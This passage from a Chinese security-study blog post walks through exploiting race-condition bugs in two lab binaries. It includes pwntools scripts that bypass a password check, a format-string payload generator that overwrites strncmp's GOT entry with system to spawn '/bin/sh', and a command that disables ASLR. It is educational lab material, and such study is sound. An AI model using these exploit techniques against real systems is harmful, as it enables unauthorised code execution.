class="string">'./Racecondition'</span>)</span><br><span class="line">        gdb.attach(p, <span class="string">'b *0x0400CB2'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = retmoe(ip, port)</span><br><span class="line">    p.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">    p.send(<span class="string">'a'</span> * <span class="number">0xf</span> + <span class="string">'\x00'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">    p.send(<span class="string">'a'</span> * <span class="number">0x30</span> + <span class="string">'\x00'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    GameStart(<span class="string">''</span>, <span class="number">2333</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>再次执行脚本</p>
+<ul>
+<li>在strcpy前断下，栈情况如下，从图中可以看到，此时share_buf中有<code>0x30</code>个a，而我们的目的是要将展示<code>0xf</code>覆盖为<code>0</code>；  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225210028.png" style="zoom:40%;"></li>
+<li>执行strcpy之后对比发现，n的位置已经被strcpy结尾的<code>\x00</code>覆盖为了<code>0</code>，这样在调用strncmp的时候，比较长度就是<code>0</code>，返回值也一定为<code>0</code>，直接绕过password的check拿到shell；  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225210341.png" style="zoom:40%;"></li>
+<li>程序最后输出“Welcome administrator!” 字样，证明这里成功的绕过了登陆验证，可以执行shell命令；  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225210601.png" style="zoom:40%;"></li>
+</ul>
+</li>
+</ol>
+<h2 id="条件竞争漏洞示例2分析"><a href="#条件竞争漏洞示例2分析" class="headerlink" title="条件竞争漏洞示例2分析"></a>条件竞争漏洞示例2分析</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><ol>
+<li><p>将程序放入IDA中，找到main函数，对main函数进行反汇编代码如下，函数功能简单，用于保存某个用户的name和life_creed，用户可以通过输入命令来进行更改这两个属性的值，也可以通过命令查看、退出等，具体流程如下：</p>
+<ol>
+<li> 命令1：输入name和life_creed信息</li>
+<li> 命令2：生成一个线程，用于修改name的值</li>
+<li> 命令3：生成一个线程，用于修改life_creed的值</li>
+<li> 命令4：显示name和life_creed的值</li>
+<li> 命令5：退出程序</li>
+</ol>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226095405.png" style="zoom:50%;"></li>
+<li><p>分析子函数功能</p>
+<ol>
+<li><p><code>sub_400AA3()</code>函数——初始化信息；</p>
+<p> 输出一串信息，输入一个命令执行响应的函数；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226095603.png" style="zoom:50%;"></li>
+<li><p><code>sub_400B69()</code>函数——输入name和life_creed信息</p>
+<p> 此过程没有进行特殊字符的检查，也没有进行strcpy()或strcmp()等敏感操作；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226095713.png" style="zoom:50%;"></li>
+<li><p><code>start_routine(void *a1)</code>函数——修改name的线程函数</p>
+<p> 此过程也没有进行上述敏感操作或sleep()操作，暂未找到可利用的地方；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226100210.png" style="zoom:50%;"></li>
+<li><p><code>sub_400CE1(void *a1)</code>函数——修改life_creed的线程函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226100504.png" style="zoom:60%;">
+
+<p> 此过程可以看到图中红色部分的子函数<code>sub_400BDA(&amp;buf, &amp;buf)</code>，对此函数进行反编译，可见其功能是对输入的字符进行检查，如果遇到特殊字符<code>%</code>、<code>$</code>就终止程序，此过程过滤了格式化字符串漏洞；</p>
+<p> 注意到蓝色框线内的strncpy函数，限制了长度，但是将buf字符串复制到dest字符串中，而dest字符串是全局变量，满足了条件竞争中的其中一个条件“共享对象”；</p>
+<p> 其中对life_creed在命令1和3中都进行了对dest修改，也满足了条件“改变对象”；</p>
+<p> 注意到绿色框线内有sleep 3秒钟，和主线程可以一起执行此子线程，满足了条件竞争的其中一个条件“并发”；</p>
+<p> 注意到黑色框线内的printf(dest)；联想到格式化字符串漏洞；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226100758.png" style="zoom:50%;"></li>
+<li><p><code>sub_400DD0()</code>函数——信息输出函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226101107.png" style="zoom:60%;"></li>
+<li><p><code>sub_400E13()</code>函数——程序退出函数</p>
+<p> 此处判断是否对此game满意，输入yes才会退出，否则继续游戏；</p>
+<p> 注意到下图的strncmp函数，此函数第一个参数为buf，没有进行敏感字符检查，想到可以将strncmp函数的got表地址修改为system函数的地址，进而buf中直接输入<code>/bin/sh</code>即可拿到shell权限；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226101232.png" style="zoom:60%;"></li>
+</ol>
+</li>
+<li><p>关于64位程序的参数存放</p>
+<ol>
+<li><p>使用gdb调试程序，设置断点，并不能在main函数设置断点，在printf设置断点；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226101534.png" style="zoom:50%;"></li>
+<li><p>在运行到<code>printf(dest)</code>时，看到如下信息</p>
+<p> 64位的格式化字符串漏洞的利用方式和32位的不同，32位的参数都是按照栈直接存储查找的，而64位的参数会先放到寄存器里，也就是说format不管多长，都只是存到下面的<strong>RDI寄存器</strong>内，可以理解为第0个参数，其余的参数存放到剩下的5个寄存器内。而ESP的指针即栈顶为第六个参数。所以再利用格式化字符串漏洞时需要先覆盖栈内的内容，再根据format查找参数进行覆写。</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226102809.png" style="zoom:50%;"></li>
+</ol>
+</li>
+</ol>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>根据上述分析，漏洞的利用思路可以分为以下几个步骤：</p>
+<ol>
+<li> 获取strncmp函数地址和system函数地址；</li>
+<li> 输入命令3，输入strncmp的got表的地址到buf，buf的值会存到栈上，buf将复制到dest里，并通过了检查，进入sleep；</li>
+<li> 输入命令1，将dest替换为格式化字符串，修改strncmp的got表地址为system函数的地址；</li>
+<li> 此时输入命令5，strncmp函数变为system函数地址，buf为第一个参数，输入<code>/bin/sh</code>时，相当于执行<code>system('/bin/sh')</code>；</li>
+</ol>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ol>
+<li><p>获取strncmp函数地址和system函数地址</p>
+<ol>
+<li><p>通过gdb调试，在<code>0x400E13</code>（ida中的地址）处设置断点，顺序执行到strncmp函数如下；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226103552.png" style="zoom:50%;"></li>
+<li><p>查看<code>0x400890</code>处的汇编指令，即可得到strncmp函数的got表地址为<code>0x602028</code>；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226103704.png" style="zoom:50%;"></li>
+<li><p>获取system函数的地址可以采用根据puts函数地址的偏移来获取，关闭地址随机化后，system函数的地址是固定的，直接print即可得到system的地址为<code>0x7ffff7812550</code>；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226103815.png" style="zoom:50%;">
+
+<p> 临时关闭地址随机化指令</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>输入命令3，修改栈上内容为strncmp的got表地址并通过检查</p>
+<ol>
+<li><p> strncmp的got表的地址为<code>0x602028</code>，由于是64位可执行程序，格式化字符串每次可以将2字节数据写入内存，此处要写8次，所以应该在栈上写上从地址<code>0x602028~0x60202f</code>，一共八个地址；</p>
+</li>
+<li><p>写一个循环，将这八个地址拼接起来，python代码如下；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">strncmp_addr</span>(<span class="params">strncmp_got</span>):</span><br><span class="line">    addr_part = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	addr_part += p64(strncmp_got + i)</span><br><span class="line">    <span class="keyword">return</span> addr_part</span><br></pre></td></tr></table></figure></li>
+<li><p>修改栈上内容为strncmp的got表地址并通过检查的代码如下;</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># overwrite stack with strncmp' got_addr and pass the check</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input your new life_creed: '</span>)</span><br><span class="line">p.sendline(strncmp_addr(strncmp_got))</span><br></pre></td></tr></table></figure></li>
+<li><p>在<code>0x400CE1</code>设置断点，查看被覆写后的栈的情况；</p>
+<p> 下图显示的栈内的红色区域即被写入strncmp函数的got表的地址，从<code>0x602028~0x60202f</code>；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226105719.png" style="zoom:50%;"></li>
+</ol>
+</li>
+<li><p>输入命令1，输入格式化字符串并修改strncmp地址为system</p>
+<ol>
+<li><p>构造格式化字符串，同上分析，需要覆写8次，而由于64位函数的参数先保存在寄存器内，再从栈上寻找，栈顶的参数恰好为printf的第6个参数，所以覆写八次，参数分别为6-13个参数，所以generate_format函数如下；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_format</span>(<span class="params">value</span>):</span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    print_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (value &gt;&gt; (<span class="number">8</span> * i)) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        one_byte = (value &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xff</span></span><br><span class="line">        payload += <span class="string">'%{0}c%{1}$hhn'</span>.<span class="built_in">format</span>((one_byte - print_count) % <span class="number">0x100</span>, <span class="number">6</span> + i)</span><br><span class="line">        print_count += (one_byte - print_count) % <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure></li>
+<li><p>输入格式化字符串并修改strncmp地址为system地址的代码如下；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system_addr = <span class="number">0x7ffff7835390</span></span><br><span class="line"><span class="comment"># replace 'life_creed' with format string</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">p.sendline(<span class="string">'yourname'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'life_creed: '</span>)</span><br><span class="line">p.sendline(generate_format(system_addr))</span><br></pre></td></tr></table></figure></li>
+<li><p>等待3秒，上一个线程就会执行printf(dest)，从而将got表中strncmp地址修改为system函数的地址；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure></li>
+<li><p>在命令5处，即<code>0x400E13</code>处设置断点，查看此时got表中strncmp函数的内容，strncmp函数的内容被覆盖为system函数的地址，即<code>0x7ffff7812550</code>；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226110328.png" style="zoom:50%;"></li>
+</ol>
+</li>
+<li><p>执行<code>system('/bin/sh')</code></p>
+<ol>
+<li><p>此时GOT表中strncmp地址已被覆写为system地址，在buf中输入<code>/bin/sh</code>，执行到strncmp函数时，第一个参数即为buf，相当于执行<code>system('/bin/sh')</code>，最后代码如下；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Are you satisfied with this game?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+<li><p>运行编写的python代码，成功拿到shell权限；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226113152.png" style="zoom:50%;"></li>
+</ol>
+</li>
+</ol>
+<p>备注：<a target="_blank" rel="noopener" href="https://github.com/Leeyuxun/Binary-Experiment-Program">实验程序下载</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>李钰璕
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E.html" title="二进制-条件竞争漏洞">https://leeyuxun.github.io/二进制-条件竞争漏洞.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-cn" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/" rel="tag"><i class="fa fa-tag"></i> 条件竞争漏洞</a>
+              <a href="/tags/%E8%BF%9B%E7%A8%8B/" rel="tag"><i class="fa fa-tag"></i> 进程</a>
+              <a href="/tags/%E7%BA%BF%E7%A8%8B/" rel="tag"><i class="fa fa-tag"></i> 线程</a>
+              <a href="/tags/%E5%8D%8F%E7%A8%8B/" rel="tag"><i class="fa fa-tag"></i> 协程</a>
+              <a href="/tags/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/" rel="tag"><i class="fa fa-tag"></i> 并发编程</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%20%E4%B8%8B%E5%8D%881.44.18.html" rel="prev" title="二进制-格式化字符串漏洞">
+      <i class="fa fa-chevron-left"></i> 二进制-格式化字符串漏洞
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E.html" rel="next" title="二进制-逻辑漏洞">
+      二进制-逻辑漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">1.1.</span> <span class="nav-text">条件竞争</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B"><span class="nav-number">1.2.</span> <span class="nav-text">进程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%BF%E7%A8%8B"><span class="nav-number">1.3.</span> <span class="nav-text">线程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%8F%E7%A8%8B"><span class="nav-number">1.4.</span> <span class="nav-text">协程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B"><span class="nav-number">1.5.</span> <span class="nav-text">并发编程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">条件竞争漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E4%BA%A7%E7%94%9F%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.2.</span> <span class="nav-text">条件竞争产生的条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E7%A4%BA%E4%BE%8B1%E5%88%86%E6%9E%90"><span class="nav-number">2.3.</span> <span class="nav-text">条件竞争漏洞示例1分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.4.</span> <span class="nav-text">条件竞争漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E7%A4%BA%E4%BE%8B2%E5%88%86%E6%9E%90"><span class="nav-number">2.5.</span> <span class="nav-text">条件竞争漏洞示例2分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">2.5.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">2.5.2.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">2.5.3.</span> <span class="nav-text">利用过程</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="李钰璕"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">李钰璕</p>
+  <div class="site-description" itemprop="description">安全学习笔记</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">89</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">115</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Leeyuxun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Leeyuxun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:leeyuxun@163.com" title="E-Mail → mailto:leeyuxun@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李钰璕</span>
+</div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = 'true';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
